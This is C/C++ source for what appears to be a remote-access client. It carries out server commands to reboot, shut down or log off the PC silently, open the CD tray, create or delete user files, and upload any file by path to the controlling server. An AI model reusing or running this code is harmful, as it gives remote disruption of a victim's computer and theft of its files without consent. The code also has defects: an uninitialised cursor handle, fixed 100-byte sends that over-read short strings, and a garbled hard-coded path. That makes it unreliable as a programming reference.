#include "Header.h"
#include <string>
void RebootPC()
{
	WinExec("shutdown -r -t 0", SW_HIDE);
	exit(0);
}
void ShutDownPC()
{
	WinExec("shutdown -s -t 0", SW_HIDE);
	exit(0);
}
void ExitSystemePC()
{
	WinExec("shutdown -l ", SW_HIDE);
	exit(0);
}
void OpenCD_ROM()
{
	mciSendString(_T("Set cdaudio door open wait"), NULL, 0, NULL);
}
void ExitFunction()
{
	exit(0);
}
void CreatFile(char path[],struct Data *data)
{
	setlocale(LC_CTYPE, "russian");
	for (int i = 0; i < strlen(path); i++)
	{
		path[i] = path[i + 1];
	}
	char str[100] = "C:\\Users\\ִלטענטי\\";
	strcat(str, path);
	printf("file created %s", str);
	if (CreateFile(LPCTSTR(str), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL) == INVALID_HANDLE_VALUE)
	{
		send(data->Server, "error, file wasn't created", 100, 0);
		printf("error, file wasn't created");
	}
	else {
		send(data->Server, "file was created", 100, 0);
		printf("file created %s", str);
	}
}
void DelFile(char path[],struct Data *data)
{
	setlocale(LC_CTYPE, "russian");
	for (int i = 0; i < strlen(path); i++)
	{
		path[i] = path[i + 1];
	}
	char str[100] = "C:\\Users\\ִלטענטי\\";
	strcat(str, path);
	if (DeleteFile(LPCTSTR(str)) == 0)
	{
		send(data->Server,"error, file wasn't deleted",100,0);
		printf("error, file wasn't deleted");
	}
	else {
		send(data->Server, "file was deleted", 100, 0);
		printf("file deleteted %s", str);
	}
}
void WorkWithCursor(struct Data *data)
{
	HCURSOR curs;
	if (DestroyCursor(curs) == false)
	{
		send(data->Server, "error", 100, 0);
		printf("error");
	}
	else {
		send(data->Server, "all is ok", 100, 0);
		printf("all is ok");
	}
}
bool sendData(struct Data *data, void *buf, int bufLen)
{
	const char *pbuf = (const char *)buf;
	while (bufLen > 0)
	{
		int num = send(data->Server, pbuf, bufLen, 0);
		if (num == SOCKET_ERROR)
		{
			if (WSAGetLastError() == WSAEWOULDBLOCK)
			{
				continue;
			}
			return false;
		}
		pbuf += num;
		bufLen -= num;
	}
	return true;
}
bool sendLong(struct Data *data, long value)
{
	value = htonl(value);
	return sendData(data, &value, sizeof(value));
}
bool sendFile(struct Data *data, FILE *f)
{
	fseek(f, 0, SEEK_END);
	long filesize = ftell(f);
	rewind(f);
	if (filesize == EOF)
		return false;
	if (!sendLong(data, filesize))
		return false;
	if (filesize > 0)
	{
		char buffer[1000000];
		do
		{
			size_t num = min(filesize, sizeof(buffer));
			num = fread(buffer, 1, num, f);
			if (num < 1)
				return false;
			if (!sendData(data, buffer, num))
				return false;
			filesize -= num;
		} while (filesize > 0);
	}
	return true;
}
void sendFileFunction(char path[],struct Data *data)
{
	setlocale(LC_CTYPE, "russian");
	for (int i = 0; i < strlen(path); i++)
	{
		path[i] = path[i + 1];
	}
	FILE *filehandle = fopen(path, "rb");
	if (filehandle != NULL)
	{
		printf("sent!");
		sendFile(data, filehandle);
		fclose(filehandle);
	}
	else printf("error");
}